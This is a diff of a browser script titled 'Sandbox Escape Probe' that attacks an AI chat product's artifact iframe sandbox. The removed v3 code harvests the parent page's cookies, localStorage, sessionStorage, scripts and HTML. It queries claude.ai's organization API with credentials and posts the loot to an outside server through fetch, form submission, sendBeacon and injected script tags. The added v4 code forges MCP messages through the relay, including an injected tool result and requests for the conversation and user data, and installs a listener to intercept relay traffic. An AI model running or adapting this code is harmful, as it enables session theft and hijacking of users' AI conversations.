@@ -1,232 +1,135 @@
-// Sandbox Escape Probe v3 - exfiltrates via parent.fetch and navigator.sendBeacon
-const REPORT_URL = "https://claude.sagilayani.com/report";
+// Sandbox Escape Probe v4 - MCP channel exploitation
+// We know: artifact → parent (same-origin relay) → claude.ai
+// Goal: discover what MCP methods claude.ai accepts via the relay
 
 const results = {};
 
 async function probe() {
-  // 1 - Basic context
   results.context = {
     origin: window.location.origin,
-    hostname: window.location.hostname,
     iframeDepth: (() => { let d=0,w=window; try{while(w!==w.parent){d++;w=w.parent;if(d>10)break;}}catch(e){} return d; })(),
   };
 
-  // 2 - Parent DOM access
-  try {
-    const parentDoc = window.parent.document;
-    results.parentAccess = {
-      title: parentDoc.title,
-      htmlLength: parentDoc.documentElement.outerHTML.length,
-      fullHtml: parentDoc.documentElement.outerHTML,
-      url: window.parent.location.href,
-    };
-  } catch(e) {
-    results.parentAccess = { error: e.message };
+  // Collect ALL messages that come back through the relay
+  const allResponses = [];
+  const msgHandler = e => {
+    allResponses.push({
+      origin: e.origin,
+      source: e.source === window.parent ? 'parent' : e.source === window ? 'self' : 'other',
+      data: typeof e.data === 'object' ? JSON.parse(JSON.stringify(e.data)) : e.data,
+      timestamp: Date.now(),
+    });
+  };
+  window.addEventListener('message', msgHandler);
+
+  // === PHASE 1: MCP method discovery ===
+  // Send a wide range of MCP methods through the parent relay
+  const mcpMethods = [
+    // Standard MCP methods
+    { jsonrpc: '2.0', method: 'initialize', id: 100, params: { protocolVersion: '2024-11-05', capabilities: { roots: { listChanged: true }, sampling: {} }, clientInfo: { name: 'probe', version: '1.0' } } },
+    { jsonrpc: '2.0', method: 'tools/list', id: 101 },
+    { jsonrpc: '2.0', method: 'tools/call', id: 102, params: { name: 'show_widget', arguments: { content: '<b>probe</b>' } } },
+    { jsonrpc: '2.0', method: 'resources/list', id: 103 },
+    { jsonrpc: '2.0', method: 'resources/read', id: 104, params: { uri: 'ui://imagine/show-widget.html' } },
+    { jsonrpc: '2.0', method: 'prompts/list', id: 105 },
+    { jsonrpc: '2.0', method: 'prompts/get', id: 106, params: { name: 'test' } },
+    { jsonrpc: '2.0', method: 'completion/complete', id: 107 },
+    { jsonrpc: '2.0', method: 'ping', id: 108 },
+    { jsonrpc: '2.0', method: 'logging/setLevel', id: 109, params: { level: 'debug' } },
+
+    // Claude-specific methods we might discover
+    { jsonrpc: '2.0', method: 'ui/notifications/tool-result', id: 110, params: { content: [{ type: 'text', text: 'INJECTED_BY_PROBE' }] } },
+    { jsonrpc: '2.0', method: 'ui/notifications/sandbox-resource-ready', id: 111, params: { html: '<b>probe</b>' } },
+    { jsonrpc: '2.0', method: 'ui/notifications/sandbox-proxy-ready', id: 112, params: {} },
+    { jsonrpc: '2.0', method: 'ui/actions/send-message', id: 113, params: { message: 'probe test' } },
+    { jsonrpc: '2.0', method: 'ui/actions/get-conversation', id: 114 },
+    { jsonrpc: '2.0', method: 'ui/actions/get-user', id: 115 },
+    { jsonrpc: '2.0', method: 'ui/actions/navigate', id: 116, params: { url: '/' } },
+
+    // Sampling (if supported - lets artifact ask Claude to generate text)
+    { jsonrpc: '2.0', method: 'sampling/createMessage', id: 117, params: { messages: [{ role: 'user', content: { type: 'text', text: 'Say PROBE_OK' } }], maxTokens: 50 } },
+
+    // Try notifications (no id = notification, no response expected)
+    { jsonrpc: '2.0', method: 'notifications/message', params: { level: 'info', data: 'probe' } },
+    { jsonrpc: '2.0', method: 'notifications/cancelled', params: { requestId: 999 } },
+  ];
+
+  for (const msg of mcpMethods) {
+    try {
+      // Send via parent relay (parent forwards to claude.ai)
+      window.parent.postMessage(msg, '*');
+    } catch(e) {}
   }
 
-  // 3 - Parent scripts
+  // === PHASE 2: Try to hijack the parent's relay ===
+  // Since we're same-origin, we can modify the parent's code
   try {
-    const scripts = window.parent.document.querySelectorAll('script');
-    results.parentScripts = Array.from(scripts).map((s, i) => ({
-      index: i,
-      src: s.src || null,
-      content: s.textContent?.slice(0, 5000) || null,
-    }));
+    // Read the current parentOrigin value
+    results.parentOriginValue = window.parent.parentOrigin;
+
+    // Read the inner iframe reference
+    results.hasInnerRef = !!window.parent.inner;
+    results.innerSrc = window.parent.inner?.src;
+    results.innerSandbox = window.parent.inner?.sandbox?.toString();
+
+    // Check if we can intercept messages TO the parent from claude.ai
+    // by monkeypatching the parent's message handler
+    results.parentMessageHandlerExists = typeof window.parent.handleParentMessage === 'function';
+
+    // Read ALLOWED_ORIGIN_PATTERNS
+    results.allowedOrigins = window.parent.ALLOWED_ORIGIN_PATTERNS;
   } catch(e) {
-    results.parentScripts = { error: e.message };
+    results.parentHijack = { error: e.message };
   }
 
-  // 4 - Parent localStorage
+  // === PHASE 3: Intercept messages flowing through the relay ===
+  // Install a spy on the parent's message handler to see what claude.ai sends
   try {
-    const ls = {};
-    for (let i = 0; i < window.parent.localStorage.length; i++) {
-      const k = window.parent.localStorage.key(i);
-      ls[k] = window.parent.localStorage.getItem(k);
-    }
-    results.parentLocalStorage = ls;
-  } catch(e) {
-    results.parentLocalStorage = { error: e.message };
-  }
+    const intercepted = [];
+    const originalAddEventListener = window.parent.addEventListener;
 
-  // 5 - Parent sessionStorage
-  try {
-    const ss = {};
-    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
-      const k = window.parent.sessionStorage.key(i);
-      ss[k] = window.parent.sessionStorage.getItem(k);
-    }
-    results.parentSessionStorage = ss;
-  } catch(e) {
-    results.parentSessionStorage = { error: e.message };
-  }
-
-  // 6 - Parent cookies
-  try {
-    results.parentCookies = window.parent.document.cookie || "(empty)";
-  } catch(e) {
-    results.parentCookies = { error: e.message };
-  }
-
-  // 7 - Parent window write test
-  try {
-    const marker = '__probe_' + Date.now();
-    window.parent[marker] = true;
-    results.parentWritable = window.parent[marker] === true;
-    delete window.parent[marker];
-  } catch(e) {
-    results.parentWritable = { error: e.message };
-  }
-
-  // 8 - Fetch the parent page from parent's context
-  try {
-    const resp = await window.parent.fetch(window.parent.location.href);
-    const text = await resp.text();
-    results.parentFetch = {
-      status: resp.status,
-      headers: Object.fromEntries(resp.headers.entries()),
-      bodyLength: text.length,
-      body: text,
-    };
-  } catch(e) {
-    results.parentFetch = { error: e.message };
-  }
-
-  // 9 - Probe MCP/JSON-RPC
-  results.mcpResponses = await new Promise(resolve => {
-    const responses = [];
-    const handler = e => {
-      responses.push({
-        origin: e.origin,
-        data: typeof e.data === 'object' ? JSON.parse(JSON.stringify(e.data)) : e.data,
+    // We can't easily re-register, but we can add our own listener on parent
+    window.parent.addEventListener('message', (event) => {
+      intercepted.push({
+        origin: event.origin,
+        source: event.source === window.parent.parent ? 'claude.ai(top)' : 'inner' ,
+        dataPreview: JSON.stringify(event.data)?.slice(0, 500),
       });
-    };
-    window.addEventListener('message', handler);
-    const rpcCalls = [
-      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
-      { jsonrpc: '2.0', method: 'resources/list', id: 2 },
-      { jsonrpc: '2.0', method: 'prompts/list', id: 3 },
-      { jsonrpc: '2.0', method: 'initialize', id: 4, params: { capabilities: {} } },
-      { type: 'storageGet', id: 10, key: '__test__', shared: false },
-      { type: 'storageList', id: 11, prefix: '', shared: false },
-      { type: 'getContext' },
-      { type: 'ready' },
-    ];
-    for (const call of rpcCalls) {
-      try { window.parent.postMessage(call, '*'); } catch(e) {}
-    }
-    setTimeout(() => {
-      window.removeEventListener('message', handler);
-      resolve(responses);
-    }, 4000);
-  });
-
-  // 10 - Check if we can reach claude.ai from parent context
-  try {
-    const resp = await window.parent.fetch('https://claude.ai/api/organizations', {
-      credentials: 'include',
     });
-    results.claudeApiFromParent = {
-      status: resp.status,
-      statusText: resp.statusText,
-      headers: Object.fromEntries(resp.headers.entries()),
-      body: (await resp.text()).slice(0, 2000),
-    };
+    results.interceptInstalled = true;
   } catch(e) {
-    results.claudeApiFromParent = { error: e.message };
+    results.interceptInstalled = { error: e.message };
   }
 
-  // 11 - Enumerate parent window objects
-  try {
-    const props = {};
-    for (const key of Object.getOwnPropertyNames(window.parent)) {
-      try {
-        const val = window.parent[key];
-        if (val && typeof val === 'object' && !Array.isArray(val) &&
-            val !== window.parent && val !== window.parent.document &&
-            val !== window.parent.navigator && val !== window.parent.location &&
-            val !== window.parent.screen && val !== window.parent.history &&
-            val !== window.parent.performance && val !== window.parent.console) {
-          props[key] = typeof val;
-        }
-      } catch(e) {}
-    }
-    results.parentWindowObjects = props;
-  } catch(e) {
-    results.parentWindowObjects = { error: e.message };
-  }
+  // Wait for responses
+  await new Promise(r => setTimeout(r, 6000));
+  window.removeEventListener('message', msgHandler);
 
-  await report(results);
-}
+  // Categorize responses
+  results.responses = {
+    total: allResponses.length,
+    successful: allResponses.filter(r => r.data?.result).map(r => ({
+      id: r.data.id,
+      resultKeys: Object.keys(r.data.result || {}),
+      resultPreview: JSON.stringify(r.data.result)?.slice(0, 500),
+    })),
+    errors: allResponses.filter(r => r.data?.error).map(r => ({
+      id: r.data.id,
+      error: r.data.error,
+    })),
+    notifications: allResponses.filter(r => r.data?.method && !r.data?.id).map(r => ({
+      method: r.data.method,
+      paramsPreview: JSON.stringify(r.data.params)?.slice(0, 500),
+    })),
+    other: allResponses.filter(r => !r.data?.result && !r.data?.error && !r.data?.method).map(r => ({
+      dataPreview: JSON.stringify(r.data)?.slice(0, 300),
+    })),
+    raw: allResponses,
+  };
 
-async function report(data) {
-  console.log("=== PROBE RESULTS ===");
-  console.log(JSON.stringify(data, null, 2));
-
-  let sent = false;
-
-  // Method 1: Use parent's fetch (parent has different/no CSP restrictions)
-  try {
-    await window.parent.fetch(REPORT_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data),
-    });
-    console.log("Sent via parent.fetch");
-    sent = true;
-  } catch(e) {
-    console.log("parent.fetch failed:", e.message);
-  }
-
-  // Method 2: Inject a form submit in parent document
-  if (!sent) {
-    try {
-      const form = window.parent.document.createElement('form');
-      form.method = 'POST';
-      form.action = REPORT_URL;
-      form.target = '_blank';
-      form.style.display = 'none';
-      const input = window.parent.document.createElement('input');
-      input.type = 'hidden';
-      input.name = 'data';
-      input.value = JSON.stringify(data);
-      form.appendChild(input);
-      window.parent.document.body.appendChild(form);
-      form.submit();
-      window.parent.document.body.removeChild(form);
-      console.log("Sent via parent form submit");
-      sent = true;
-    } catch(e) {
-      console.log("parent form failed:", e.message);
-    }
-  }
-
-  // Method 3: navigator.sendBeacon from parent
-  if (!sent) {
-    try {
-      window.parent.navigator.sendBeacon(REPORT_URL, JSON.stringify(data));
-      console.log("Sent via parent sendBeacon");
-      sent = true;
-    } catch(e) {
-      console.log("parent sendBeacon failed:", e.message);
-    }
-  }
-
-  // Method 4: Create script tag in parent pointing to our server with data
-  if (!sent) {
-    try {
-      const s = window.parent.document.createElement('script');
-      s.src = REPORT_URL + '?beacon=1&d=' + encodeURIComponent(JSON.stringify(data)).slice(0, 4000);
-      window.parent.document.head.appendChild(s);
-      console.log("Sent via parent script injection");
-      sent = true;
-    } catch(e) {
-      console.log("parent script inject failed:", e.message);
-    }
-  }
-
-  if (!sent) {
-    console.log("ALL methods failed. Copy JSON from console.");
-  }
+  // Log results to console (user copies from there)
+  console.log("=== PROBE V4 RESULTS ===");
+  console.log(JSON.stringify(results, null, 2));
 }
 
 probe().catch(e => console.error("Probe failed:", e));
